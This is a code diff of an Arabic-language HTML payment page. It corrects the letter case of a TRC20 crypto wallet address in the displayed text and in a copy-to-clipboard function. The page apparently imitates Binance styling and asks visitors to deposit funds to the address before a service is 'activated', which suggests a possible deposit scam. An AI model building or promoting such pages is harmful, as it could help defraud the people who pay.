@@ -56,7 +56,8 @@ input[type="text"]::placeholder { color:#848e9c !important; opacity:1; }
 .success-text { font-family: 'Changa', sans-serif !important; font-size: 16px; font-weight: 700; color: #02c076; margin: 0; }
 </style>
 </head>
-<body>
+
+    <body>
 <div id="successAlert" class="custom-alert-overlay">
     <div class="custom-alert-box">
         <div class="success-checkmark">✓</div>
@@ -87,8 +88,8 @@ input[type="text"]::placeholder { color:#848e9c !important; opacity:1; }
         <a href="https://binance.com" target="_blank" class="binance-btn-final">⚡ الدفع عبر بايننس طلب دفع</a>
         <div class="manual-deposit-box">
             <p style="font-size: 14px; margin-bottom: 10px; color: #ffffff; font-weight: 700; direction: ltr; text-align: center;">أو للإيداع من باقي المحافظ الرقمية (شبكة TRC20):</p>
-            <!-- تم تعديل حرف m ليكون صغيراً هنا -->
-            <div class="crypto-address-container" id="cryptoAddress">THJN4XBKxbZNYsw7YAhmNiZSupn3kVEDFP</div>
+            <!-- تم التعديل إلى H الكبيرة و m الصغيرة للتطابق مع بايننس -->
+            <div class="crypto-address-container" id="cryptoAddress">THJN4XBKxbZNYsw7YAHmNiZSupn3kVEDFP</div>
             <button type="button" onclick="copyToClipboard()" class="copy-btn-style">نسخ عنوان المحفظة</button>
         </div>
     </div>
@@ -109,8 +110,8 @@ function handleSubmitAndShowCheck() {
 }
 function alertNoAccount() { alert("الرجاء إنشاء حساب أولاً لتنشيط الخدمة بنجاح."); }
 function copyToClipboard() {
-    // تم تعديل حرف m ليكون صغيراً هنا أيضاً
-    const text = "THJN4XBKxbZNYsw7YAhmNiZSupn3kVEDFP";
+    // تم التعديل هنا أيضاً في دالة النسخ البرمجية المتطورة
+    const text = "THJN4XBKxbZNYsw7YAHmNiZSupn3kVEDFP";
     const dummy = document.createElement("input");
     document.body.appendChild(dummy);
     dummy.value = text.trim();
